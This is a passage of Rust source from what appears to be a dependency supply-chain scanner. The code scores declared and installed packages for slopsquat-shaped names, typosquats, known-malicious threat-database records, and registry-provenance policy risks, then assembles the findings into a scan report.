            "the name begins with the language prefix '{}' and stacks {} descriptive \
             tokens — a shape LLMs produce for plausible-but-fake packages",
            tokens[0],
            tokens.len()
        ));
    }

    // Shape B — most tokens are generic filler words.
    if tokens.len() >= 2 && filler_count >= 2 && filler_count * 2 >= tokens.len() {
        return Some(format!(
            "{filler_count} of the name's {} tokens are generic filler words \
             ({}) — the hallmark of an LLM-generated descriptive name",
            tokens.len(),
            tokens
                .iter()
                .filter(|t| HALLUCINATION_FILLER_WORDS.contains(t))
                .copied()
                .collect::<Vec<_>>()
                .join(", ")
        ));
    }

    // Shape C — 4+ tokens with at least one filler word (a filler word is also
    // required because real packages are occasionally long).
    if tokens.len() >= 4 && filler_count >= 1 {
        return Some(format!(
            "the name stacks {} '-'/'_'-separated tokens including filler words — \
             real packages are rarely this descriptively long",
            tokens.len()
        ));
    }

    None
}

/// If one of `name`'s `-`/`_` tokens is itself a known-popular package (and the
/// whole name is not that package), return it. Catches the `<popular>-helper`
/// slopsquat shape; the token must be >= 3 chars so short tokens don't match.
fn popular_token_in_name(name: &str, db: Option<&ThreatDb>, eco: Ecosystem) -> Option<String> {
    let db = db?;
    let lower = name.to_lowercase();
    let bare = lower.rsplit('/').next().unwrap_or(&lower);
    let tokens: Vec<&str> = bare.split(['-', '_']).filter(|t| t.len() >= 3).collect();
    // A single-token name *is* its token, not an embedding — require composition.
    if tokens.len() < 2 {
        return None;
    }
    for token in tokens {
        if token == bare {
            continue;
        }
        if db.is_popular_package(eco, token) {
            return Some(token.to_string());
        }
    }
    None
}

/// A complete, explainable risk assessment of one declared dependency.
#[derive(Debug, Clone, Serialize)]
pub struct DependencyAssessment {
    /// The dependency as declared in the manifest.
    pub dependency: DeclaredDependency,
    /// The manifest file the dependency was declared in (scan-root-relative
    /// when the scan was given a directory).
    pub manifest: String,
    /// The deterministic `package_risk` factor breakdown for this package.
    pub risk: RiskBreakdown,
    /// The slopsquat heuristic verdict.
    pub slopsquat: SlopsquatAssessment,
    /// The constraint-aware threat-DB assessment for this dependency's
    /// `(ecosystem, name, version-intent)`. A serializable summary, never a
    /// `ThreatMatch`. Omitted from JSON when there is no record so a clean
    /// report gains no `"no_record"` noise.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub threat_assessment: Option<PackageThreatAssessment>,
    /// `true` when a policy allowlist entry suppressed this dependency's
    /// findings (the assessment is still reported, for transparency).
    pub allowlisted: bool,
}

/// Build the Medium/Warn finding for a dependency whose malicious-package
/// version could not be resolved (an unpinned/range manifest entry over a
/// version-specific record, or a constraint that overlaps the affected
/// versions). Advises pinning to a known non-affected version.
fn unresolved_dependency_finding(
    dep: &DeclaredDependency,
    manifest: &str,
    summary: &crate::threatdb::ThreatMatchSummary,
    affected_versions: &[String],
) -> Finding {
    let affected_list = if affected_versions.is_empty() {
        "unknown".to_string()
    } else {
        affected_versions.join(", ")
    };
    let declared = dep
        .version
        .as_version_str()
        .map(|v| format!("declared as '{v}'"))
        .unwrap_or_else(|| "declared without a version".to_string());
    Finding {
        rule_id: RuleId::ThreatUnresolvedMaliciousPackage,
        severity: Severity::Medium,
        title: format!(
            "Unresolved malicious {} dependency: {}",
            dep.ecosystem, dep.name
        ),
        description: format!(
            "The {} dependency '{}' {declared} in {} is flagged as malicious by {} for \
             specific versions ({affected_list}), but the request could not be resolved to a \
             definite version. Pin an exact non-affected version (or remove the dependency) to \
             clear this warning.",
            dep.ecosystem, dep.name, manifest, summary.source_label,
        ),
        evidence: vec![Evidence::ThreatIntel {
            source: summary.source_label.clone(),
            threat_type: "unresolved_malicious_package".to_string(),
            confidence: summary.confidence,
            reference: summary.reference_url.clone(),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

/// Build the [`Finding`]s a single [`DependencyAssessment`] produces, reusing
/// the existing package-supply-chain [`RuleId`]s. An allowlisted dependency
/// produces no findings. `policy` carries the `package_policy` thresholds for
/// the `PackagePolicy*` rule paths (`&Policy::default()` keeps the baseline).
pub fn findings_for(
    assessment: &DependencyAssessment,
    policy: &crate::policy::Policy,
) -> Vec<Finding> {
    if assessment.allowlisted {
        return Vec::new();
    }

    let mut findings = Vec::new();
    let dep = &assessment.dependency;
    let manifest = &assessment.manifest;

    // 0 — constraint-aware threat-DB assessment (A1e). An exact/all-versions
    // hit dominates and stands alone (returns); an unresolved or intersecting
    // constraint emits the Medium/Warn but falls through, since the name may
    // ALSO be a typosquat or near-popular.
    match &assessment.threat_assessment {
        Some(PackageThreatAssessment::ExactMatch(summary)) => {
            findings.push(Finding {
                rule_id: RuleId::ThreatMaliciousPackage,
                severity: crate::rules::threatintel::confidence_to_severity(summary.confidence),
                title: format!("Known malicious {} dependency: {}", dep.ecosystem, dep.name),
                description: format!(
                    "The {} dependency '{}' declared in {} is flagged as malicious by {}. {}",
                    dep.ecosystem,
                    dep.name,
                    manifest,
                    summary.source_label,
                    if summary.all_versions_malicious {
                        "All versions are affected."
                    } else {
                        "Specific version(s) affected."
                    }
                ),
                evidence: vec![Evidence::ThreatIntel {
                    source: summary.source_label.clone(),
                    threat_type: "malicious_package".to_string(),
                    confidence: summary.confidence,
                    reference: summary.reference_url.clone(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return findings;
        }
        Some(PackageThreatAssessment::ConstraintIntersectsAffected {
            summary,
            affected_versions,
        }) => {
            findings.push(unresolved_dependency_finding(
                dep,
                manifest,
                summary,
                affected_versions,
            ));
        }
        Some(PackageThreatAssessment::Unresolved {
            summary,
            affected_versions,
            ..
        }) => {
            findings.push(unresolved_dependency_finding(
                dep,
                manifest,
                summary,
                affected_versions,
            ));
        }
        Some(PackageThreatAssessment::ConstraintExcludesAffected)
        | Some(PackageThreatAssessment::NoRecord)
        | None => {}
    }

    // 1 — confirmed malicious typosquat from the threat DB; stands alone.
    if let Some(target) = &assessment.risk.malicious_typosquat_of {
        findings.push(Finding {
            rule_id: RuleId::ThreatPackageTyposquat,
            severity: Severity::High,
            title: format!("Confirmed typosquat dependency: {} → {}", dep.name, target),
            description: format!(
                "The {} dependency '{}' declared in {} is a confirmed typosquat of the \
                 popular package '{}' (source: local threat database). Risk score \
                 {}/100 ({}).",
                dep.ecosystem,
                dep.name,
                manifest,
                target,
                assessment.risk.score,
                assessment.risk.risk_level,
            ),
            evidence: vec![Evidence::Text {
                detail: format!(
                    "manifest={manifest} package={} ecosystem={} typosquat_of={target}",
                    dep.name, dep.ecosystem
                ),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
        return findings;
    }

    // 2 — slopsquat-suspicious (AI-hallucinated name near a popular package).
    // The `Suspicious` variant carries the anchor and reasons directly.
    if let SlopsquatAssessment::Suspicious {
        reasons,
        near_popular,
    } = &assessment.slopsquat
    {
        findings.push(Finding {
            rule_id: RuleId::ThreatSuspiciousPackage,
            severity: Severity::Medium,
            title: format!(
                "Possible slopsquat dependency: {} (near '{}')",
                dep.name, near_popular
            ),
            description: format!(
                "The {} dependency '{}' declared in {} is not a known-real package and its \
                 name is shaped like an AI-hallucinated ('slopsquat') name sitting near the \
                 real package '{}'. {}. Verify the package is intentional and exists on its \
                 registry before trusting it. Risk score {}/100 ({}).",
                dep.ecosystem,
                dep.name,
                manifest,
                near_popular,
                reasons.join("; "),
                assessment.risk.score,
                assessment.risk.risk_level,
            ),
            evidence: vec![Evidence::Text {
                detail: format!(
                    "manifest={manifest} package={} ecosystem={} near_popular={near_popular} \
                     reasons=[{}]",
                    dep.name,
                    dep.ecosystem,
                    reasons.join(" | "),
                ),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
        return findings;
    }

    // 3 — name resembles a popular package (one edit) with no slopsquat shape
    // and no DB typosquat record. The weakest signal.
    if let NameVsPopular::NearPopular {
        popular_name,
        distance,
    } = &assessment.risk.name_vs_popular
    {
        findings.push(Finding {
            rule_id: RuleId::ThreatPackageSimilarName,
            severity: Severity::Medium,
            title: format!(
                "Dependency name similar to popular package: {} ≈ {}",
                dep.name, popular_name
            ),
            description: format!(
                "The {} dependency '{}' declared in {} is within edit distance {} of the \
                 popular package '{}'. This may be a typosquat or a coincidence — verify the \
                 name is intentional. Risk score {}/100 ({}).",
                dep.ecosystem,
                dep.name,
                manifest,
                distance,
                popular_name,
                assessment.risk.score,
                assessment.risk.risk_level,
            ),
            evidence: vec![Evidence::Text {
                detail: format!(
                    "manifest={manifest} package={} ecosystem={} similar_to={popular_name} \
                     distance={distance}",
                    dep.name, dep.ecosystem
                ),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
        return findings;
    }

    // 4 — provenance-only risk (PR #121 fix-list item 2): when no name-shape
    // signal fires but the deterministic score reaches High/Critical purely
    // from registry provenance, the package is risky on registry data alone
    // and must still emit a finding. Thresholds read from
    // `policy.package_policy.*_effective()`; score >= block → High, warn ≤
    // score < block → Medium.
    let warn_score = policy.package_policy.warn_aggregate_score_effective();
    let block_score = policy.package_policy.block_aggregate_score_effective();
    let score = assessment.risk.score;
    let risk_level = assessment.risk.risk_level;
    if score >= warn_score {
        let severity = if score >= block_score {
            Severity::High
        } else {
            Severity::Medium
        };
        // Name the contributing factors, in display order, so the description
        // points at hand-verifiable evidence.
        let factor_labels: Vec<&str> = assessment
            .risk
            .factors
            .iter()
            .filter(|f| f.points > 0)
            .map(|f| f.label.as_str())
            .collect();
        let factor_summary = if factor_labels.is_empty() {
            "registry-API provenance signals".to_string()
        } else {
            factor_labels.join(", ")
        };
        findings.push(Finding {
            rule_id: RuleId::ThreatSuspiciousPackage,
            severity,
            title: format!(
                "High-risk provenance for {} dependency: {} ({}/100, {})",
                dep.ecosystem, dep.name, assessment.risk.score, risk_level,
            ),
            description: format!(
                "The {} dependency '{}' declared in {} has elevated provenance risk \
                 (score {}/100, {}) driven by registry signals rather than a known-bad \
                 name: {}. Review the factor breakdown — run `tirith package explain \
                 {} {}` — and verify the package is intentional before installing.",
                dep.ecosystem,
                dep.name,
                manifest,
                assessment.risk.score,
                risk_level,
                factor_summary,
                dep.ecosystem,
                dep.name,
            ),
            evidence: vec![Evidence::Text {
                detail: format!(
                    "manifest={manifest} package={} ecosystem={} risk_score={} \
                     risk_level={} factors=[{}]",
                    dep.name, dep.ecosystem, assessment.risk.score, risk_level, factor_summary,
                ),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }

    findings
}

/// Emit `PackagePolicy*` findings for one dependency assessment. Signals are
/// read from the `ApiProvenance` on the breakdown so the scan path's evidence
/// matches the `install_txn` path's.
fn policy_findings_for_assessment(
    assessment: &DependencyAssessment,
    policy: &crate::policy::Policy,
) -> Vec<Finding> {
    let mut out = Vec::new();
    let dep = &assessment.dependency;
    let manifest = &assessment.manifest;
    let pp = &policy.package_policy;
    let provenance: Option<&package_risk::ApiProvenance> = match &assessment.risk.api_signals {
        package_risk::ApiSignals::Available { provenance } => Some(provenance),
        _ => None,
    };

    // `PackagePolicyTyposquatDistance` is an OFFLINE gate (reads
    // `name_vs_popular`, no registry call). Emit it BEFORE the `Some(prov)`
    // gate so a degraded `--online` scan still surfaces typosquat findings; the
    // API-backed gates below all require provenance.
    if let Some(max_dist) = pp.block_typosquat_distance {
        if let package_risk::NameVsPopular::NearPopular {
            popular_name,
            distance,
        } = &assessment.risk.name_vs_popular
        {
            if (*distance as u32) <= max_dist {
                out.push(Finding {
                    rule_id: RuleId::PackagePolicyTyposquatDistance,
                    severity: Severity::High,
                    title: format!(
                        "Typosquat distance below policy threshold: {} '{}' ≈ '{}'",
                        dep.ecosystem, dep.name, popular_name,
                    ),
                    description: format!(
                        "Dependency '{}' declared in {manifest} is edit-distance {distance} from \
                         the popular {} package '{popular_name}', at or below the policy \
                         threshold {max_dist}.",
                        dep.name, dep.ecosystem,
                    ),
                    evidence: vec![Evidence::Text {
                        detail: format!(
                            "manifest={manifest} package={} ecosystem={} similar_to={popular_name} \
                             distance={distance} threshold={max_dist}",
                            dep.name, dep.ecosystem,
                        ),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
            }
        }
    }

    let Some(prov) = provenance else {
        return out;
    };

    // PackagePolicyNotFound — registry-confirmed 404 + block_not_found
    if pp.block_not_found
        && matches!(
            prov.package_existence,
            package_risk::PackageExistence::NotFound
        )
    {
        out.push(Finding {
            rule_id: RuleId::PackagePolicyNotFound,
            severity: Severity::High,
            title: format!(
                "Package not found: {} '{}' (policy block_not_found)",
                dep.ecosystem, dep.name
            ),
            description: format!(
                "Dependency '{}' declared in {manifest} was not found in the {} registry \
                 (HTTP 404). Policy `block_not_found: true` requires this to block.",
                dep.name, dep.ecosystem,
            ),
            evidence: vec![Evidence::Text {
                detail: format!(
                    "manifest={manifest} package={} ecosystem={} existence=not_found",
                    dep.name, dep.ecosystem
                ),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }

    // PackagePolicyNewerThanDays — package_age_days vs thresholds
    if let Some(age_days) = prov.package_age_days {
        let warn_d = pp.warn_newer_than_days;
        let block_d = pp.block_newer_than_days;
        let (fired, sev) = match (block_d, warn_d) {
            (Some(b), _) if (age_days as u32) <= b => (true, Severity::High),
            (_, Some(w)) if (age_days as u32) <= w => (true, Severity::Medium),
            _ => (false, Severity::Medium),
        };
        if fired {
            out.push(Finding {
                rule_id: RuleId::PackagePolicyNewerThanDays,
                severity: sev,
                title: format!(
                    "Dependency newer than policy threshold: {} '{}' ({} day{})",
                    dep.ecosystem,
                    dep.name,
                    age_days,
                    if age_days == 1 { "" } else { "s" },
                ),
                description: format!(
                    "Dependency '{}' declared in {manifest} was first published {age_days} day(s) \
                     ago — trips warn_newer_than_days={:?} / block_newer_than_days={:?}.",
                    dep.name, warn_d, block_d,
                ),
                evidence: vec![Evidence::Text {
                    detail: format!(
                        "manifest={manifest} package={} ecosystem={} package_age_days={age_days} \
                         warn_threshold={warn_d:?} block_threshold={block_d:?}",
                        dep.name, dep.ecosystem,
                    ),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    // PackagePolicyLowDownloads
    if let (Some(dl), Some(low)) = (prov.recent_downloads, pp.warn_low_downloads_below) {
        if dl <= low as u64 {
            out.push(Finding {
                rule_id: RuleId::PackagePolicyLowDownloads,
                severity: Severity::Medium,
                title: format!(
                    "Dependency has low recent downloads: {} '{}' ({})",
                    dep.ecosystem, dep.name, dl,
                ),
                description: format!(
                    "Dependency '{}' declared in {manifest} reports {dl} recent downloads, at or \
                     below the policy threshold {low}.",
                    dep.name,
                ),
                evidence: vec![Evidence::Text {
                    detail: format!(
                        "manifest={manifest} package={} ecosystem={} recent_downloads={dl} threshold={low}",
                        dep.name, dep.ecosystem,
                    ),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    // PackagePolicyUnknownPackageWithInstallScripts
    if pp.block_install_scripts_for_unknown_packages
        && matches!(
            assessment.risk.name_vs_popular,
            package_risk::NameVsPopular::Unknown
        )
    {
        if let Some(iss) = prov.install_script_signals.as_ref() {
            if iss.has_network_call || iss.has_shell_spawn {
                out.push(Finding {
                    rule_id: RuleId::PackagePolicyUnknownPackageWithInstallScripts,
                    severity: Severity::High,
                    title: format!(
                        "Unknown {} dependency ships install-time scripts: '{}'",
                        dep.ecosystem, dep.name,
                    ),
                    description: format!(
                        "Dependency '{}' declared in {manifest} is not a known-popular {} name and \
                         its install scripts include a network call or shell spawn.",
                        dep.name, dep.ecosystem,
                    ),
                    evidence: vec![Evidence::Text {
                        detail: format!(
                            "manifest={manifest} package={} ecosystem={} has_network_call={} has_shell_spawn={}",
                            dep.name, dep.ecosystem, iss.has_network_call, iss.has_shell_spawn,
                        ),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
            }
        }
    }

    // PackageOsvAdvisoryActive — severity driven by `block_osv_min_cvss`: a
    // CVSS at/above the threshold elevates to High, else Medium.
    if let Some(advs) = prov.osv_advisories.as_ref() {
        if !advs.is_empty() {
            let min_block_cvss = pp.block_osv_min_cvss_effective();
            let max_cvss = advs.iter().filter_map(|a| a.cvss).fold(0.0_f32, f32::max);
            let severity = if max_cvss >= min_block_cvss {
                Severity::High
            } else {
                Severity::Medium
            };
            let ids: Vec<&str> = advs.iter().take(3).map(|a| a.id.as_str()).collect();
            out.push(Finding {
                rule_id: RuleId::PackageOsvAdvisoryActive,
                severity,
                title: format!(
                    "Active OSV advisory for {} dependency: {} ({} advisory)",
                    dep.ecosystem,
                    dep.name,
                    advs.len(),
                ),
                description: format!(
                    "Dependency '{}' declared in {manifest} matches {} OSV advisory record(s): \
                     {}. Highest CVSS in the set: {max_cvss}. Policy `block_osv_min_cvss = \
                     {min_block_cvss}` — severity is {} when the highest CVSS meets/exceeds the \
                     threshold.",
                    dep.name,
                    advs.len(),
                    ids.join(", "),
                    if matches!(severity, Severity::High) {
                        "High"
                    } else {
                        "Medium"
                    },
                ),
                evidence: vec![Evidence::Text {
                    detail: format!(
                        "manifest={manifest} package={} ecosystem={} max_cvss={max_cvss} \
                         threshold={min_block_cvss} advisories={}",
                        dep.name,
                        dep.ecosystem,
                        ids.join(","),
                    ),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    // PackagePolicyTyposquatDistance is emitted at the top of this function
    // BEFORE the `Some(prov)` gate — see the comment there for rationale.

    out
}

/// Why `ecosystem scan` could not score a manifest, or a note about a partial
/// result. Surfaced in the report so a scan is honest about its coverage.
#[derive(Debug, Clone, Serialize)]
pub struct ScanNote {
    /// The manifest the note concerns, when it concerns one.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub manifest: Option<String>,
    /// The human-readable note.
    pub note: String,
}

/// The complete result of an `ecosystem scan`.
#[derive(Debug, Clone, Serialize)]
pub struct EcosystemScanReport {
    /// The scan root (directory or file) the scan was given.
    pub scan_root: String,
    /// Which mode the scan ran in — `"manifests"`, `"installed"`, or
    /// `"specific_lockfile"`. The two CLI surfaces emit byte-identical output.
    pub mode: &'static str,
    /// The manifest files discovered and parsed.
    pub manifests: Vec<String>,
    /// Total declared dependencies discovered across all manifests.
    pub dependency_count: usize,
    /// The per-dependency assessments, in a stable order.
    pub assessments: Vec<DependencyAssessment>,
    /// Whether the registry-API (`--online`) signals were used.
    pub online: bool,
    /// Notes about coverage — unreadable manifests, truncation, missing DB.
    pub notes: Vec<ScanNote>,
    /// B5: installed-distribution integrity, in `--installed` mode only. Carries
    /// the per-distribution RECORD verification and the cross-distribution
    /// ownership findings. `skip_serializing_if = Option::is_none` so the
    /// manifest/lockfile modes (which never compute it) keep byte-identical JSON.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub integrity: Option<InstalledIntegrityReport>,
    /// The verdict: every finding from every non-allowlisted dependency.
    pub verdict: Verdict,
}

/// How a scan resolves the registry-API state per dependency. Supplied by the
/// CLI layer so the core stays free of network / env knowledge.
pub enum OnlineMode<'a> {
    /// Offline scan — API signals are [`ApiSignals::NotComputed`].
    Off,
    /// `--online` scan — the (offline-safe) closure resolves each
    /// `(ecosystem, name)` to its [`ApiSignals`], called at most once per package.
    Resolver(&'a dyn Fn(Ecosystem, &str) -> ApiSignals),
}

/// What an `ecosystem_scan` operates on. The engine has one entry point
/// ([`scan`]); the mode picks which inputs feed the per-package scoring loop.
/// Two CLI surfaces share `scan` and differ only in the mode they pass.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub enum ScanMode {
    /// Walk the project root for dependency *manifests* (the shipping behavior).
    #[default]
    Manifests,
    /// Walk *installed* trees (`node_modules`, `site-packages`, `vendor`,
    /// `Cargo.lock`) — what is actually on disk, which can drift from intent.
    Installed,
    /// Parse the given file directly as a lockfile (the `package scan
    /// --lockfile <path>` form).
    SpecificLockfile(PathBuf),
}

impl ScanMode {
    /// The short, stable label for `--format json`'s top-level `mode` field.
    pub fn as_str(&self) -> &'static str {
        match self {
            ScanMode::Manifests => "manifests",
            ScanMode::Installed => "installed",
            ScanMode::SpecificLockfile(_) => "specific_lockfile",
        }
    }
}

/// Inputs to [`scan`] — a struct so the signature stays stable.
pub struct ScanRequest<'a> {
    /// The directory or single manifest file to scan.
    pub root: &'a Path,
    /// The loaded threat DB, or `None` (scan still runs; signals fall back to
    /// "unknown" and a note is added).
    pub db: Option<&'a ThreatDb>,
    /// The registry-API resolution mode.
    pub online: OnlineMode<'a>,
    /// `true` when a `(ecosystem, name)` pair is allowlisted and suppressed.
    pub is_allowlisted: &'a dyn Fn(Ecosystem, &str) -> bool,
    /// Which input the scan operates on. Defaults to [`ScanMode::Manifests`].
    pub mode: ScanMode,
    /// Cap on installed entries in [`ScanMode::Installed`]; `0` = unbounded.
    /// Ignored for the other modes.
    pub installed_max_entries: usize,
    /// The active policy for the `PackagePolicy*` rule paths and the
    /// configurable thresholds. `None` keeps the `Policy::default()` baseline.
    pub policy: Option<&'a crate::policy::Policy>,
}

/// Run an `ecosystem scan` over `request.root` and return the full report.
/// The single entry point: discovers manifests, parses and scores every
/// dependency, folds in [`slopsquat`], and assembles a [`Verdict`]. Never
/// panics; a malformed manifest is skipped with a note.
pub fn scan(request: &ScanRequest) -> EcosystemScanReport {
    let mut notes: Vec<ScanNote> = Vec::new();

    if request.db.is_none() {
        notes.push(ScanNote {
            manifest: None,
            note: "the local threat database is not installed — popular-package and \
                   typosquat signals are unavailable, so scoring is weaker. Run \
                   `tirith threat-db update` to install it."
                .to_string(),
        });
    }

    let root_display = request.root.display().to_string();

    // Dispatch on mode → (manifest_labels, declared_deps). Downstream scoring +
    // verdict assembly is mode-independent (the byte-identical-JSON invariant).
    let (mut manifest_labels, mut declared) = match &request.mode {
        ScanMode::Manifests => collect_from_manifests(request, &mut notes),
        ScanMode::Installed => collect_from_installed_tree(request, &mut notes),
        ScanMode::SpecificLockfile(path) => collect_from_specific_lockfile(path, &mut notes),
    };

    // Stable order across runs and CLI surfaces — sort again at the dispatch
    // boundary so we don't rely on per-walker ordering.
    manifest_labels.sort();
    manifest_labels.dedup();
    declared.sort_by(|(a, am), (b, bm)| {
        am.cmp(bm)
            .then_with(|| a.ecosystem.to_string().cmp(&b.ecosystem.to_string()))
            .then_with(|| a.name.cmp(&b.name))
    });

    let dependency_count = declared.len();
    let truncated = declared.len() > MAX_DEPENDENCIES;
    if truncated {
        notes.push(ScanNote {
            manifest: None,
            note: format!(
                "{} dependencies declared; scoring was capped at {MAX_DEPENDENCIES}.",
                declared.len()
            ),
        });
        declared.truncate(MAX_DEPENDENCIES);
    }

    // Score each dependency; the registry-API resolver is memoized per package.
    let online = matches!(request.online, OnlineMode::Resolver(_));
    let mut api_cache: std::collections::HashMap<(Ecosystem, String), ApiSignals> =
        std::collections::HashMap::new();
    let mut assessments: Vec<DependencyAssessment> = Vec::new();

    for (dep, manifest) in declared {
        let assessment = assess_dependency(&dep, &manifest, request, &mut api_cache);
        assessments.push(assessment);
    }

    // On `--online`, surface how many deps could not get provenance — a
    // fully-degraded online scan would otherwise look clean. A representative
    // reason is carried so the note is actionable without one line per dep.
    if online {
        let unavailable: Vec<&DependencyAssessment> = assessments
            .iter()
            .filter(|a| matches!(a.risk.api_signals, ApiSignals::Unavailable { .. }))
            .collect();
        if !unavailable.is_empty() {
            let sample_reason = unavailable.iter().find_map(|a| match &a.risk.api_signals {
                ApiSignals::Unavailable { reason } => Some(reason.clone()),
                _ => None,
            });
            let note = match sample_reason {
                Some(reason) => format!(
                    "registry-API provenance was unavailable for {} of {} dependency/dependencies \
                     — the --online half of the scan was degraded for them (e.g. {reason}). \
                     Those packages were scored with offline signals only.",
                    unavailable.len(),
                    assessments.len(),
                ),
                None => format!(
                    "registry-API provenance was unavailable for {} of {} dependency/dependencies \
                     — the --online half of the scan was degraded for them; they were scored \
                     with offline signals only.",
                    unavailable.len(),
                    assessments.len(),
                ),
            };
            notes.push(ScanNote {
                manifest: None,
                note,
            });
        }
    }

    // Assemble the verdict: every finding from every assessment.
    let default_policy = crate::policy::Policy::default();
    let effective_policy = request.policy.unwrap_or(&default_policy);
    let mut findings: Vec<Finding> = Vec::new();
    for assessment in &assessments {
        findings.extend(findings_for(assessment, effective_policy));
        // Policy-driven per-dependency rules; allowlisted assessments suppress
        // these too, matching `findings_for`.
        if !assessment.allowlisted {
            findings.extend(policy_findings_for_assessment(assessment, effective_policy));
        }
    }

    // B5 installed-distribution integrity: only in `--installed` mode (the
    // manifest/lockfile modes do not have a real installed tree to verify). The
    // pass builds the ownership index once per site-packages root, runs the lax
    // installed-RECORD verifier per distribution, scans the site root for startup
    // hooks, and correlates the granular signals into one
    // `PythonInstalledIntegrityViolation` finding folded into the same verdict.
    let integrity = if matches!(request.mode, ScanMode::Installed) {
        let report = collect_installed_integrity(request.root);
        findings.extend(report.correlated_findings(effective_policy));
        // B6: the startup-hook execution correlation (the two startup findings)
        // runs over the same report's startup signals, folded into the same
        // verdict so policy overrides apply uniformly.
        findings.extend(report.startup_correlated_findings());
        Some(report)
    } else {
        None
    };

    // tier_reached is 3 — `ecosystem scan` does the full analysis. Assemble via
    // the shared finalizer so policy `action_overrides` (and severity overrides
    // and paranoia) are honored here, not only on the engine hot path.
    let verdict = crate::escalation::finalize_static_verdict(
        findings,
        effective_policy,
        3,
        Timings::default(),
    );

    EcosystemScanReport {
        scan_root: root_display,
        manifests: manifest_labels,
        dependency_count,
        assessments,
        online,
        notes,
        integrity,
        verdict,
        mode: request.mode.as_str(),
    }
}

// Per-mode collectors all return (manifest_labels, declared_deps) in the same
// shape so the downstream scoring loop is mode-independent.

/// Walk `request.root` for dependency manifests and parse each one — the
/// shipping `ecosystem scan` behavior.
fn collect_from_manifests(
    request: &ScanRequest,
    notes: &mut Vec<ScanNote>,
) -> (Vec<String>, Vec<(DeclaredDependency, String)>) {
    let manifests = discover_manifests(request.root);
    if manifests.is_empty() {
        notes.push(ScanNote {
            manifest: None,
            note: "no dependency manifests found (looked for package.json, \
                   package-lock.json, requirements*.txt, pyproject.toml, Cargo.toml, \
                   go.mod, Gemfile)."
                .to_string(),
        });
    }

    let mut declared: Vec<(DeclaredDependency, String)> = Vec::new();
    let mut manifest_labels: Vec<String> = Vec::new();
    for manifest in &manifests {
        let rel = relative_label(request.root, &manifest.path);
        manifest_labels.push(rel.clone());
        parse_one_manifest(manifest, &rel, &mut declared, notes);
    }
    (manifest_labels, declared)
}

/// Read a single lockfile by path (the `--lockfile <path>` form). An
/// unrecognized file produces a note rather than an empty scan.
fn collect_from_specific_lockfile(
    path: &Path,
    notes: &mut Vec<ScanNote>,
) -> (Vec<String>, Vec<(DeclaredDependency, String)>) {
    if !path.exists() {
        notes.push(ScanNote {
            manifest: None,
            note: format!("lockfile not found: {}", path.display()),
        });
        return (Vec::new(), Vec::new());
    }
    let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
        notes.push(ScanNote {
            manifest: None,
            note: format!("lockfile has no readable file name: {}", path.display()),
        });
        return (Vec::new(), Vec::new());
    };
    let Some(kind) = ManifestKind::from_file_name(name) else {
        notes.push(ScanNote {
            manifest: None,
            note: format!(
                "lockfile '{}' is not a recognized manifest format (expected one of \
                 package.json, package-lock.json, requirements*.txt, pyproject.toml, \
                 Cargo.toml, go.mod, Gemfile).",
                path.display()
            ),
        });
        return (Vec::new(), Vec::new());
    };
    let discovered = DiscoveredManifest {
        path: path.to_path_buf(),
        kind,
    };
    let label = path.display().to_string();
    let mut declared: Vec<(DeclaredDependency, String)> = Vec::new();
    parse_one_manifest(&discovered, &label, &mut declared, notes);
    (vec![label], declared)
}

/// Walk installed-tree directories under `request.root` and synthesize
/// per-package declarations. Looks for `node_modules/` (npm), `site-packages/`
/// `.dist-info/METADATA` (PyPI), `vendor/` (Go), and the root `Cargo.lock`
/// (Rust). Respects `request.installed_max_entries`, noting any truncation.
fn collect_from_installed_tree(
    request: &ScanRequest,
    notes: &mut Vec<ScanNote>,
) -> (Vec<String>, Vec<(DeclaredDependency, String)>) {
    let mut declared: Vec<(DeclaredDependency, String)> = Vec::new();
    let mut manifest_labels: Vec<String> = Vec::new();
    let cap = if request.installed_max_entries == 0 {
        usize::MAX
    } else {
        request.installed_max_entries
    };
    let mut truncated_at: Option<usize> = None;

    let label_for = |p: &Path| -> String { relative_label(request.root, p) };

    // npm: node_modules/<scope?>/<pkg>/package.json
    let node_modules = request.root.join("node_modules");
    if node_modules.is_dir() {
        walk_node_modules(
            &node_modules,
            cap,
            &mut declared,
            &mut manifest_labels,
            &mut truncated_at,
            &label_for,
        );
    }

    // PyPI: site-packages/<dist>.dist-info/METADATA (the CLI passes
    // `VIRTUAL_ENV` as the scan root separately).
    for sp in find_site_packages_dirs(request.root) {
        if truncated_at.is_some() {
            break;
        }
        walk_site_packages(
            &sp,
            cap,
            &mut declared,
            &mut manifest_labels,
            &mut truncated_at,
            &label_for,
        );
    }

    // Go: vendor/<host>/<owner>/<mod>/
    if truncated_at.is_none() {
        let vendor = request.root.join("vendor");
        if vendor.is_dir() {
            walk_vendor_go(
                &vendor,
                cap,
                &mut declared,
                &mut manifest_labels,
                &mut truncated_at,
                &label_for,
            );
        }
    }

    // Rust: Cargo.lock at the workspace root
    if truncated_at.is_none() {
        let lock = request.root.join("Cargo.lock");
        if lock.is_file() {
            if let Ok(text) = std::fs::read_to_string(&lock) {
                let label = label_for(&lock);
                manifest_labels.push(label.clone());
                for dep in parse_cargo_lock(&text) {
                    if declared.len() >= cap {
                        truncated_at = Some(cap);
                        break;
                    }
                    declared.push((dep, label.clone()));
                }
            }
        }
    }

